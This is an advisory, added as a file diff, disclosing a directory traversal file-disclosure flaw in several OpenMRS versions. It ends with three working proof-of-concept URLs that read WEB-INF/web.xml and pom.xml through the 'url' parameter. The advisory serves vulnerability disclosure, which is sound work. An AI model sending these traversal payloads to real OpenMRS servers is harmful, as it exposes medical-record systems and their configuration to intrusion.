@@ -1,0 +1,45 @@
+OpenMRS 2.3 (1.11.4) Local File Disclosure Vulnerability
+
+
+Vendor: OpenMRS Inc.
+Product web page: http://www.openmrs.org
+Affected version: OpenMRS 2.3, 2.2, 2.1, 2.0 (Platform 1.11.4 (Build 6ebcaf), 1.11.2 and 1.10.0)
+                  OpenMRS-TB System (OpenMRS 1.9.7 (Build 60bd9b))
+
+Summary: OpenMRS is an application which enables design
+of a customized medical records system with no programming
+knowledge (although medical and systems analysis knowledge
+is required). It is a common framework upon which medical
+informatics efforts in developing countries can be built.
+
+Desc: OpenMRS suffers from a file disclosure vulnerability
+when input passed thru the 'url' parameter to viewPortlet.htm
+script is not properly verified before being used to include
+files. This can be exploited to include files from local
+resources with directory traversal attacks.
+
+
+Tested on: Ubuntu 12.04.5 LTS
+           Apache Tomcat/7.0.26
+           Apache Tomcat/6.0.36
+           Apache Coyote/1.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5286
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5286.php
+
+Vendor: https://talk.openmrs.org/t/openmrs-security-advisories-2015-11-30/3868
+
+
+02.11.2015
+
+--
+
+
+http://127.0.0.1:8080/openmrs/module/reporting/viewPortlet.htm?id=reportDesignPortlet&url=..%2f..%2f..%2fWEB-INF%2fweb.xml%3bx%3d
+http://127.0.0.1:8080/openmrs/module/reporting/viewPortlet.htm?id=reportProcessorPortlet&url=..%2f..%2f..%2fWEB-INF%2fweb.xml%3bx
+http://127.0.0.1:8080/openmrs/module/reporting/viewPortlet.htm?id=reportDesignPortlet&url=..%2f..%2f..%2fMETA-INF%2fmaven%2forg.openmrs.web%2fopenmrs-webapp%2fpom.xml%3bx%3d
